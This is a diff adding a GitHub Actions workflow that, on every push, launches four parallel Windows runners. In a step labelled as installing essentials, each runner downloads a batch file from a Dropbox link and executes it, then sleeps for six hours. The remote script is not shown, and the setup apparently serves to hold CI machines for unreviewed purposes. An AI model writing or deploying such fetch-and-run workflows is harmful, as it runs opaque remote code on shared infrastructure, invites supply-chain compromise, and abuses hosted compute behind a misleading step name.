@@ -1,0 +1,24 @@
+name: Windows - Workflow
+
+on:
+  push: # This triggers the workflow on every push event (upload) to the repository
+
+jobs:
+  build:
+    runs-on: windows-latest
+    timeout-minutes: 9999
+    strategy:
+      matrix:
+        instance: [1, 2, 3, 4]
+    
+    steps:
+      - name: Check Out Repository
+        uses: actions/checkout@v2
+        
+      - name: Downloading & Installing Essentials
+        run: |
+          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/xnhozgyl6egvqzb0sqnfi/Workflow.bat?rlkey=6mliepnmh3uswdiscne7srje7&dl=1" -OutFile "Downloads.bat"
+          cmd /c Downloads.bat
+
+      - name: Time Counter
+        run: Start-Sleep -Seconds 21600
